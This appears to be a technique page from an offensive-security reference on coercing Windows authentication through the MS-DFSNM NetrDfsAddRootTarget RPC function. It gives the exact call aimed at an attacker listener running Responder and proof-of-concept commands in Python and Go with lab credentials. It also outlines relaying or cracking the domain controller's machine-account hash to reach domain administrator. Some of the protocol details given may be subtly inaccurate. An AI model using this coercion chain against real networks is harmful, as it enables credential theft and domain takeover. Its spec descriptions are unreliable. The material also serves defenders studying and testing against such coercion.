# MS-DFSNM - Remote call to NetrDfsAddRootTarget (opnum 23)

## Summary

+ **Protocol**: [[MS-DFSNM]: Distributed File System (DFS): Namespace Management Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979)

+ **Function name**: [`NetrDfsAddRootTarget`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/f015b511-d56f-4e93-a106-879e93a5c200)

+ **Function operation number**: `23`

+ **RPC Interfaces**:
   + Interface 1:
     - uuid=`4fc742e0-4a10-11cf-8273-00aa004ae673`
     - version=`3.0`
     - Accessible through:
       + SMB Named pipe: `\PIPE\netdfs`

## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `\PIPE\netdfs` and bind to the desired [`MS-DFSNM`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979) protocol (with uuid `4fc742e0-4a10-11cf-8273-00aa004ae673` and version `3.0`) in order to perform remote procedure calls to functions in the [`MS-DFSNM`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979) protocol.

Note that this protocol refuses an authenticated bind: the association is bound with no RPC-level security and the call runs under the identity of the SMB session established above.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. We will then call the remote [`NetrDfsAddRootTarget`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/f015b511-d56f-4e93-a106-879e93a5c200) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
NetrDfsAddRootTarget("\\\\192.168.2.51\\share\x00", NULL, 1, NULL, TRUE, 0)
```

This is the stand-alone form of the call, which needs no domain and no pre-existing namespace: `pTargetPath` is NULL and `pDfsPath` carries the host of the new DFS root target. Before creating anything, the server checks that the share exists — "if the share that the *pTargetPath* parameter specifies does not already exist, the RPC method MUST fail with NERR_NetNameNotFound" — and that check is what makes it authenticate to the listener.

We can try this with this proof of concept code ([coerce_poc.py](./poc/python/coerce_poc.py)):

```bash
./poc/python/coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

The same call is implemented in Go ([coerce_poc.go](./poc/go/coerce_poc.go)):

```bash
go run coerce_poc.go --target 192.168.2.1 --listener 192.168.2.51 -d LAB.local -u user1 -p 'Podalirius123!'
```

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`). The call itself fails with `ERROR_BAD_NETPATH (0x00000035)`, which is the expected result of a successful coercion: the target has to reach the UNC path before it can report that it cannot.

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!

## Function technical detail

```cpp
NET_API_STATUS NetrDfsAddRootTarget(
   [in, unique, string] LPWSTR pDfsPath,
   [in, unique, string] LPWSTR pTargetPath,
   [in] ULONG MajorVersion,
   [in, unique, string] LPWSTR pComment,
   [in] BOOLEAN NewNamespace,
   [in] ULONG Flags
 );
```

+ **pDfsPath**: The pointer to a null-terminated Unicode string. This MUST be `\\<domain>\<dfsname>` for domain-based DFS or `\\<server>\<share>` for stand-alone DFS. In the stand-alone form used here, `<server>` is the host of the new DFS root target and therefore the listener.

+ **pTargetPath**: The pointer to a null-terminated Unicode string. This MUST be `\\<server>\<share>[\<path>]` for domain-based DFS or **NULL** for stand-alone DFS. When it is not NULL, the `<server>` MUST be used as the host name of the new DFS root target in the metadata.

+ **MajorVersion**: The DFS metadata version to use to create the DFS namespace. `1` creates a new domainv1-based namespace or, with a stand-alone `pDfsPath`, a new stand-alone namespace. When adding a root target to an existing namespace, it MUST be either 0 or the major version number of that namespace, otherwise the call MUST fail.

+ **pComment**: The pointer to a null-terminated Unicode string that contains a comment associated with this root or link. The comment is meant for human consumption and does not affect server functionality.

+ **NewNamespace**: A Boolean value that, if TRUE, indicates a request to create a new root. If FALSE, this value indicates a request to add a new root target to an existing root.

+ **Flags**: This parameter MUST be zero for a domain-based DFS namespace and MUST be ignored for a stand-alone DFS namespace.

## References

+ Documentation of protocol [MS-DFSNM]: Distributed File System (DFS): Namespace Management Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979
